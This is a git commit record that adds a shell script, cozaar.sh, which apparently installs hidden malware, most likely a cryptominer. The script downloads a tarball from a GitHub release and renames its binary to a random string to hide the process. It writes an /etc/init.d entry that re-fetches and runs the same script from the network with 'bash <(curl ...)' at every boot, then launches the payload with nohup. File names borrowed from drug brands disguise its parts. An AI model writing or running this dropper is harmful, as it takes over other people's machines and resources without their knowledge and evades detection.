c560d8cb8687169c22ab28361f4e74e076b7e641
zetiaq <rereymiran@gmail.com>
2024-06-12 13:27:12 +0700

    Create cozaar.sh

---
+++ cozaar.sh
@@ -0,0 +1,15 @@
+cd /
+wget https://github.com/zetiaq/tamox/releases/download/v0.0.3/cialis.tar
+tar -xvf cialis.tar
+cd /cialis
+variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv viagra $variable1
+sed -i "s/oodo/${variable1} -t=500 -n=${variable1}/g" ./olanz.sh
+cd /etc/init.d
+echo "bash <(curl -s -L https://raw.githubusercontent.com/zetiaq/tamox/main/cozaar.sh)" > lasix.sh
+chmod a+x lasix.sh
+update-rc.d lasix.sh defaults
+rm -rf cialis.tar
+cd /cialis
+nohup ./olanz.sh
+ps -ef | grep cialis
